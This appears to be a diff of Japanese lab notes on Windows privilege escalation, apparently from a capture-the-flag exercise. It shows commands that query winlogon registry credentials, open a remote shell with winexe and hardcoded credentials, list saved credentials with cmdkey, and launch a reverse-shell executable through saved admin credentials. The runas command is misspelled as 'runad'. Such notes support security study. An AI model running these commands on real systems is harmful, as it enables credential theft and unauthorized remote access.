@@ -63,7 +63,10 @@ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 以下のコマンドで、リモートで shell 接続できる。
 winexe -U 'admin%password123' //10.10.136.203 cmd.exe
 
-
+【5. 保存されている Credential 情報の利用】
+cmdkey /list
+で、保存されている認証情報を列挙し、admin がある場合、以下のコマンドで、リバースシェルを実行
+runad /savecred /user:admin C:\PrivEsc\reverse.exe
 
 
 
